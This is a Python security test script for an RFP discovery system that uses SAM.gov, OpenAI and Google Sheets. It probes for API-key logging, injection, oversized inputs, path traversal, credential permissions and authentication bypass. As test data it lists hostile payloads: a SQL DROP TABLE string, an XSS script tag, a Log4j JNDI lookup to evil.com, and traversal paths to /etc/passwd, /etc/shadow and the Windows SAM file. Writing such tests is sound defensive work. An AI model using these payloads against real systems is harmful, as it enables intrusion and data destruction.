#!/usr/bin/env python3
"""
Specific vulnerability tests for RFP Discovery System

This script tests for specific known vulnerability patterns and edge cases
that could cause system failures or security issues.
"""

import json
import time
import os
import tempfile
import requests
from datetime import datetime
from unittest.mock import patch, MagicMock
import logging

# Import system components
from config import Config
from sam_client import SAMClient
from ai_qualifier import AIQualifier
from sheets_manager import SheetsManager
from drive_manager import DriveManager

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SpecificVulnerabilityTester:
    """Test for specific vulnerability patterns"""
    
    def __init__(self):
        self.vulnerabilities = []
    
    def run_specific_tests(self):
        """Run specific vulnerability tests"""
        logger.info("Running specific vulnerability tests...")
        
        # Test API key exposure
        self.test_api_key_exposure()
        
        # Test injection attacks
        self.test_injection_vulnerabilities()
        
        # Test memory exhaustion
        self.test_memory_exhaustion()
        
        # Test file system vulnerabilities
        self.test_filesystem_vulnerabilities()
        
        # Test configuration issues
        self.test_configuration_vulnerabilities()
        
        # Test data validation bypasses
        self.test_data_validation_bypasses()
        
        # Test authentication bypasses
        self.test_authentication_bypasses()
        
        return self.vulnerabilities
    
    def add_vulnerability(self, severity, name, description, impact, recommendation):
        """Add vulnerability to list"""
        self.vulnerabilities.append({
            'timestamp': datetime.now().isoformat(),
            'severity': severity,
            'name': name,
            'description': description,
            'impact': impact,
            'recommendation': recommendation
        })
        logger.warning(f"VULNERABILITY [{severity}]: {name} - {description}")
    
    def test_api_key_exposure(self):
        """Test for API key exposure vulnerabilities"""
        logger.info("Testing API key exposure...")
        
        # Check if API keys are logged
        test_messages = []
        
        class TestLogHandler(logging.Handler):
            def emit(self, record):
                test_messages.append(self.format(record))
        
        handler = TestLogHandler()
        root_logger = logging.getLogger()
        root_logger.addHandler(handler)
        
        try:
            # Try operations that might log API keys
            if Config.SAM_API_KEY:
                client = SAMClient(Config.SAM_API_KEY)
                try:
                    client.search_by_naics("541511", "01/01/2024", "01/02/2024")
                except:
                    pass
            
            # Check logs for exposed keys
            for message in test_messages:
                if Config.SAM_API_KEY and Config.SAM_API_KEY in message:
                    self.add_vulnerability(
                        "HIGH",
                        "SAM_API_KEY_LOGGED",
                        "SAM API key appears in log messages",
                        "API key could be exposed in log files",
                        "Mask API keys in all log output"
                    )
                
                if Config.OPENAI_API_KEY and Config.OPENAI_API_KEY in message:
                    self.add_vulnerability(
                        "HIGH",
                        "OPENAI_API_KEY_LOGGED",
                        "OpenAI API key appears in log messages",
                        "API key could be exposed in log files",
                        "Mask API keys in all log output"
                    )
        
        finally:
            root_logger.removeHandler(handler)
    
    def test_injection_vulnerabilities(self):
        """Test for injection attack vulnerabilities"""
        logger.info("Testing injection vulnerabilities...")
        
        # Test SQL injection patterns in RFP data
        malicious_inputs = [
            "'; DROP TABLE opportunities; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/}",  # Log4j-style injection
            "../../../etc/passwd",  # Path traversal
            "eval('malicious_code')",  # Code injection
        ]
        
        for malicious_input in malicious_inputs:
            try:
                # Test in RFP titles and descriptions
                malicious_opportunity = {
                    "title": malicious_input,
                    "description": malicious_input,
                    "noticeId": "test_injection"
                }
                
                # Test AI qualifier
                if Config.OPENAI_API_KEY:
                    qualifier = AIQualifier(Config.OPENAI_API_KEY)
                    result = qualifier.assess_opportunity(malicious_opportunity)
                    
                    # Check if malicious input was sanitized
                    if malicious_input in str(result):
                        self.add_vulnerability(
                            "MEDIUM",
                            "INJECTION_NOT_SANITIZED",
                            f"Malicious input not sanitized: {malicious_input[:30]}",
                            "Could lead to injection attacks",
                            "Implement input sanitization"
                        )
                
                # Test sheets manager
                if Config.GOOGLE_SHEETS_CREDS_PATH:
                    manager = SheetsManager(Config.GOOGLE_SHEETS_CREDS_PATH)
                    fake_assessment = {"relevance_score": 1, "is_qualified": False, "justification": "test"}
                    
                    try:
                        if Config.SPAM_SPREADSHEET_ID:
                            manager.add_to_spam_sheet(Config.SPAM_SPREADSHEET_ID, malicious_opportunity, fake_assessment)
                    except Exception as e:
                        if "injection" in str(e).lower() or "malicious" in str(e).lower():
                            logger.info(f"✓ Correctly blocked malicious input: {malicious_input[:20]}")
                        else:
                            logger.warning(f"Unexpected error with malicious input: {str(e)}")
            
            except Exception as e:
                logger.info(f"Exception with malicious input {malicious_input[:20]}: {str(e)}")
    
    def test_memory_exhaustion(self):
        """Test for memory exhaustion vulnerabilities"""
        logger.info("Testing memory exhaustion...")
        
        # Test with extremely large RFP data
        huge_string = "A" * (10 * 1024 * 1024)  # 10MB string
        
        huge_opportunity = {
            "title": huge_string,
            "description": huge_string,
            "noticeId": "test_memory"
        }
        
        try:
            if Config.OPENAI_API_KEY:
                qualifier = AIQualifier(Config.OPENAI_API_KEY)
                start_time = time.time()
                result = qualifier.assess_opportunity(huge_opportunity)
                end_time = time.time()
                
                if end_time - start_time > 300:  # More than 5 minutes
                    self.add_vulnerability(
                        "MEDIUM",
                        "MEMORY_EXHAUSTION_TIMEOUT",
                        "Large input caused excessive processing time",
                        "Could cause denial of service",
                        "Implement input size limits and timeouts"
                    )
        except MemoryError:
            self.add_vulnerability(
                "HIGH",
                "MEMORY_EXHAUSTION_ERROR",
                "System ran out of memory processing large input",
                "Could cause system crashes",
                "Implement memory usage monitoring and limits"
            )
        except Exception as e:
            logger.info(f"Large input handled: {str(e)}")
    
    def test_filesystem_vulnerabilities(self):
        """Test for filesystem vulnerabilities"""
        logger.info("Testing filesystem vulnerabilities...")
        
        # Test path traversal in file operations
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
        ]
        
        for path in malicious_paths:
            try:
                # Test if drive manager prevents path traversal
                if Config.GOOGLE_SHEETS_CREDS_PATH:
                    manager = DriveManager(Config.GOOGLE_SHEETS_CREDS_PATH)
                    
                    # Try to create folder with malicious name
                    try:
                        folder_id = manager.create_folder(path)
                        logger.warning(f"Created folder with suspicious path: {path}")
                    except Exception as e:
                        logger.info(f"✓ Correctly blocked malicious path: {path}")
                        
            except Exception as e:
                logger.info(f"Path traversal test failed: {str(e)}")
    
    def test_configuration_vulnerabilities(self):
        """Test for configuration vulnerabilities"""
        logger.info("Testing configuration vulnerabilities...")
        
        # Check for insecure defaults
        config_issues = []
        
        # Check if API keys are hardcoded
        if hasattr(Config, 'SAM_API_KEY') and Config.SAM_API_KEY and not os.getenv('SAM_API_KEY'):
            config_issues.append("SAM API key appears to be hardcoded")
        
        if hasattr(Config, 'OPENAI_API_KEY') and Config.OPENAI_API_KEY and not os.getenv('OPENAI_API_KEY'):
            config_issues.append("OpenAI API key appears to be hardcoded")
        
        # Check file permissions on credentials
        if Config.GOOGLE_SHEETS_CREDS_PATH and os.path.exists(Config.GOOGLE_SHEETS_CREDS_PATH):
            stat_info = os.stat(Config.GOOGLE_SHEETS_CREDS_PATH)
            mode = oct(stat_info.st_mode)[-3:]
            
            if mode != '600':  # Should be readable only by owner
                self.add_vulnerability(
                    "MEDIUM",
                    "INSECURE_CREDENTIALS_PERMISSIONS",
                    f"Credentials file has permissions {mode} instead of 600",
                    "Credentials could be readable by other users",
                    "Set credentials file permissions to 600"
                )
        
        # Check for debug mode or verbose logging in production
        if logging.getLogger().level == logging.DEBUG:
            self.add_vulnerability(
                "LOW",
                "DEBUG_LOGGING_ENABLED",
                "Debug logging is enabled",
                "May expose sensitive information in logs",
                "Disable debug logging in production"
            )
        
        for issue in config_issues:
            self.add_vulnerability(
                "HIGH",
                "HARDCODED_CREDENTIALS",
                issue,
                "Credentials exposed in source code",
                "Use environment variables for all credentials"
            )
    
    def test_data_validation_bypasses(self):
        """Test for data validation bypass vulnerabilities"""
        logger.info("Testing data validation bypasses...")
        
        # Test extremely long strings
        long_strings = {
            "title": "A" * 10000,
            "description": "B" * 100000,
            "noticeId": "C" * 1000,
            "fullParentPathName": "D" * 5000
        }
        
        try:
            if Config.GOOGLE_SHEETS_CREDS_PATH and Config.SPAM_SPREADSHEET_ID:
                manager = SheetsManager(Config.GOOGLE_SHEETS_CREDS_PATH)
                fake_assessment = {"relevance_score": 1, "is_qualified": False, "justification": "test"}
                
                manager.add_to_spam_sheet(Config.SPAM_SPREADSHEET_ID, long_strings, fake_assessment)
                
                # If this succeeds, it might cause issues
                self.add_vulnerability(
                    "LOW",
                    "NO_STRING_LENGTH_VALIDATION",
                    "System accepts extremely long strings without validation",
                    "Could cause display issues or database problems",
                    "Implement string length limits"
                )
        except Exception as e:
            logger.info(f"✓ System handled long strings: {str(e)}")
        
        # Test special characters and encoding
        special_chars = {
            "title": "Test \x00 null \x01 byte",
            "description": "Test\r\n\tspecial\x0bchars",
            "noticeId": "test\u0000unicode"
        }
        
        try:
            if Config.OPENAI_API_KEY:
                qualifier = AIQualifier(Config.OPENAI_API_KEY)
                result = qualifier.assess_opportunity(special_chars)
                
                # Check if special characters were handled
                result_str = str(result)
                if "\x00" in result_str or "\x01" in result_str:
                    self.add_vulnerability(
                        "LOW",
                        "SPECIAL_CHARACTERS_NOT_SANITIZED",
                        "Special control characters not sanitized",
                        "Could cause parsing or display issues",
                        "Sanitize control characters from input"
                    )
        except Exception as e:
            logger.info(f"Special characters handled: {str(e)}")
    
    def test_authentication_bypasses(self):
        """Test for authentication bypass vulnerabilities"""
        logger.info("Testing authentication bypasses...")
        
        # Test with empty API keys
        empty_key_tests = [
            ("", "Empty string API key"),
            (None, "None API key"),
            ("null", "Literal 'null' string"),
            ("undefined", "Literal 'undefined' string"),
            (" ", "Whitespace API key"),
        ]
        
        for key, description in empty_key_tests:
            try:
                client = SAMClient(key)
                opportunities = client.search_by_naics("541511", "01/01/2024", "01/02/2024")
                
                if opportunities:
                    self.add_vulnerability(
                        "CRITICAL",
                        "AUTH_BYPASS_EMPTY_KEY",
                        f"System returned data with {description}",
                        "Authentication can be bypassed",
                        "Implement strict API key validation"
                    )
            except Exception as e:
                logger.info(f"✓ Correctly rejected {description}: {str(e)}")
        
        # Test with malformed API keys
        malformed_keys = [
            "fake_key_123",
            "bearer_token_here",
            "api_key=actual_key",  # Potential injection
        ]
        
        for key in malformed_keys:
            try:
                client = SAMClient(key)
                opportunities = client.search_by_naics("541511", "01/01/2024", "01/02/2024")
                
                if opportunities:
                    self.add_vulnerability(
                        "HIGH",
                        "AUTH_BYPASS_MALFORMED_KEY",
                        f"System returned data with malformed key: {key}",
                        "Weak authentication validation",
                        "Implement proper API key format validation"
                    )
            except Exception as e:
                logger.info(f"✓ Correctly rejected malformed key: {str(e)}")

def main():
    """Run specific vulnerability tests"""
    tester = SpecificVulnerabilityTester()
    vulnerabilities = tester.run_specific_tests()
    
    # Generate report
    report = {
        'timestamp': datetime.now().isoformat(),
        'total_vulnerabilities': len(vulnerabilities),
        'vulnerabilities': vulnerabilities,
        'summary': {
            'critical': sum(1 for v in vulnerabilities if v['severity'] == 'CRITICAL'),
            'high': sum(1 for v in vulnerabilities if v['severity'] == 'HIGH'),
            'medium': sum(1 for v in vulnerabilities if v['severity'] == 'MEDIUM'),
            'low': sum(1 for v in vulnerabilities if v['severity'] == 'LOW'),
        }
    }
    
    # Save report
    filename = f"specific_vulnerabilities_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as f:
        json.dump(report, f, indent=2)
    
    # Print summary
    print(f"\nSPECIFIC VULNERABILITY TEST RESULTS")
    print("="*50)
    print(f"Total vulnerabilities found: {len(vulnerabilities)}")
    print(f"Critical: {report['summary']['critical']}")
    print(f"High: {report['summary']['high']}")
    print(f"Medium: {report['summary']['medium']}")
    print(f"Low: {report['summary']['low']}")
    print(f"\nDetailed report saved to: {filename}")
    
    return report

if __name__ == "__main__":
    main()